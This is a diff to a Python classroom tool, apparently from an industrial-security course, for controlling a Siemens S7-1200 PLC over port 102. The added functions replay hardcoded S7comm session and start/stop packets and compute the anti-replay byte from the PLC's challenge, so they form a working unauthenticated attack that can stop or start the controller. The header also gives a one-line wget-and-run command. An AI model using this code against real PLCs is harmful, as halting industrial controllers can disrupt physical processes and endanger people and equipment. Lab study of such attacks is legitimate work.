@@ -9,7 +9,7 @@
 # Script de NiPeGun para interactuar con un PLC Siemens S7-1200, versión 1214c
 #
 # Ejecución remota (puede requerir permisos sudo):
-#   wget -N --no-cache https://raw.githubusercontent.com/nipegun/zubiri/refs/heads/main/CETI/SegInd/PLCDeClase-Interactuar.py && python3 PLCDeClase-Interactuar.py [IPDelPLC]
+#   wget -q -N --no-cache https://raw.githubusercontent.com/nipegun/zubiri/refs/heads/main/CETI/SegInd/PLCDeClase-Interactuar.py && python3 PLCDeClase-Interactuar.py [IPDelPLC]
 #
 # Bajar y editar directamente el archivo en nano:
 #   curl -sL https://raw.githubusercontent.com/nipegun/zubiri/refs/heads/main/CETI/SegInd/PLCDeClase-Interactuar.py | nano -
@@ -22,12 +22,14 @@ import argparse
 import sys
 import io
 
+
 # Definir constantes para colores
 cColorAzul='\033[0;34m'
 cColorAzulClaro='\033[1;34m'
 cColorVerde='\033[1;32m'
 cColorRojo='\033[1;31m'
 cFinColor='\033[0m' # Vuelve al color normal
+
 
 def fConectar(vHost):
   print(f"\n  Conectando a {vHost} en el puerto 102... \n")
@@ -40,6 +42,7 @@ def fConectar(vHost):
   except socket.error as e:
     print(f"\n  Error al conectar con el PLC: {e} \n")
     return None
+
 
 def fEnviarPayload(payload, con):
   print(f"\n  Enviando: {payload} \n")
@@ -54,6 +57,53 @@ def fEnviarPayload(payload, con):
   except socket.timeout:
     print("\n  Error: El PLC no respondió en el tiempo esperado. \n")
     return None
+
+
+def fEncenderPLC(vHost):
+  s = fConectar(vHost)
+  if not s:
+    return
+
+  COTP_RQ = '030000231ee00000006400c1020600c20f53494d415449432d524f4f542d4553c0010a'
+  S7_COMM_RQ = '030000ee02f080720100df31000004ca0000000100000120360000011d00040000000000a1000000d3821f0000a3816900151553657276657253657373696f6e5f31433943333846a38221001532302e302e302e303a305265616c74656b20555342204762452046616d696c7920436f6e74726f6c6c65722e54435049502e33a38228001500a38229001500a3822a0015194445534b544f502d494e414d4455385f313432323331343036a3822b000401a3822c001201c9c38fa3822d001500a1000000d3817f0000a38169001515537562736372697074696f6e436f6e7461696e6572a2a20000000072010000'
+  vPayloadEncender = '0300004302f0807202003431000004f200000010000003ca3400000034019077000803000004e88969001200000000896a001300896b00040000000000000072020000'
+
+  fEnviarPayload(COTP_RQ, s)
+  data = fEnviarPayload(S7_COMM_RQ, s)
+  if not data:
+    s.close()
+    return
+  challenge = data.hex()[48:50]
+  anti = int(challenge, 16) + int("80", 16)
+  vPayloadEncender = vPayloadEncender[:46] + hex(anti)[2] + vPayloadEncender[47:]
+  vPayloadEncender = vPayloadEncender[:47] + hex(anti)[3] + vPayloadEncender[48:]
+  fEnviarPayload(vPayloadEncender, s)
+  print("\n  PLC iniciado correctamente \n.")
+  s.close()
+
+
+def fApagarPLC(vHost):
+  s = fConectar(vHost)
+  if not s:
+    return
+
+  COTP_RQ = '030000231ee00000006400c1020600c20f53494d415449432d524f4f542d4553c0010a'
+  S7_COMM_RQ = '030000ee02f080720100df31000004ca0000000100000120360000011d00040000000000a1000000d3821f0000a3816900151553657276657253657373696f6e5f31433943333846a38221001532302e302e302e303a305265616c74656b20555342204762452046616d696c7920436f6e74726f6c6c65722e54435049502e33a38228001500a38229001500a3822a0015194445534b544f502d494e414d4455385f313432323331343036a3822b000401a3822c001201c9c38fa3822d001500a1000000d3817f0000a38169001515537562736372697074696f6e436f6e7461696e6572a2a20000000072010000'
+  vPayloadApagar = '0300004302f0807202003431000004f200000010000003ca3400000034019077000801000004e88969001200000000896a001300896b00040000000000000072020000'
+
+  fEnviarPayload(COTP_RQ, s)
+  data = fEnviarPayload(S7_COMM_RQ, s)
+  if not data:
+    s.close()
+    return
+  challenge = data.hex()[48:50]
+  anti = int(challenge, 16) + int("80", 16)
+  vPayloadApagar = vPayloadApagar[:46] + hex(anti)[2] + vPayloadApagar[47:]
+  vPayloadApagar = vPayloadApagar[:47] + hex(anti)[3] + vPayloadApagar[48:]
+  fEnviarPayload(vPayloadApagar, s)
+  print("\n  PLC detenido correctamente. \n")
+  s.close()
+
 
 def print_output(stdscr, message):
   """ Función para imprimir mensajes en una ventana centrada en la pantalla. """
@@ -87,16 +137,26 @@ def fMenu(stdscr, vHost):
 
   menu = [
     "Encender PLC", "  Apagar PLC",
-    "Encender salida 0", "  Apagar salida 0",
-    "Encender salida 1", "  Apagar salida 1",
-    "Encender salida 2", "  Apagar salida 2",
-    "Encender salida 3", "  Apagar salida 3",
-    "Encender salida 4", "  Apagar salida 4",
-    "Encender salida 5", "  Apagar salida 5",
-    "Encender salida 6", "  Apagar salida 6",
-    "Encender salida 7", "  Apagar salida 7",
-    "Encender salida 8", "  Apagar salida 8",
-    "Encender salida 9", "  Apagar salida 9",
+    "Encender salida 0",
+    "  Apagar salida 0",
+    "Encender salida 1",
+    "  Apagar salida 1",
+    "Encender salida 2",
+    "  Apagar salida 2",
+    "Encender salida 3",
+    "  Apagar salida 3",
+    "Encender salida 4",
+    "  Apagar salida 4",
+    "Encender salida 5",
+    "  Apagar salida 5",
+    "Encender salida 6",
+    "  Apagar salida 6",
+    "Encender salida 7",
+    "  Apagar salida 7",
+    "Encender salida 8",
+    "  Apagar salida 8",
+    "Encender salida 9",
+    "  Apagar salida 9",
     "Salir"
   ]
   
